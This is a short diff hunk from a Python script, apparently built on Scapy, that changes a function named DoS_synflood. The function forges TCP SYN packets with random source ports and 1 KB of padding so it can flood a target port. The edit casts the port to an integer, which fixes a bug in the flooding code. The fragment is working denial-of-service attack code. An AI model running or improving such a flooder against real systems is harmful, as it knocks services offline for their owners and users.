@@ -132,7 +132,7 @@ def DoS_synflood():
     # forge a TCP SYN packet with a random source port
     # and the target port as the destination port
 
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+    tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
     
     # add some flooding data (1kb in this case)
     raw = RawVal(b"X"*1024)
